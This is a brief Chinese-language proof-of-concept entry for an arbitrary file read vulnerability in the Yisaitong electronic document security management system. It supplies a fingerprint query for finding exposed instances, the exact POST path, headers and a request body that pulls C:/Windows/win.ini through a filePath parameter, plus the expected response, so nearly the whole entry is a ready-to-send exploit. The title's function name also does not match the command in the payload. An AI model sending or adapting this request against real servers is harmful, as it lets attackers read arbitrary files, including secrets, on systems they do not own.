# 亿赛通ViewDecyptFile存在任意文件读取漏洞

- **系统**：亿赛通　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
command=ViewUploadFile&filePath=C:/Windows/win.ini&fileName1=1.png&uploadFileId=1
```
- **预期**：200　|　—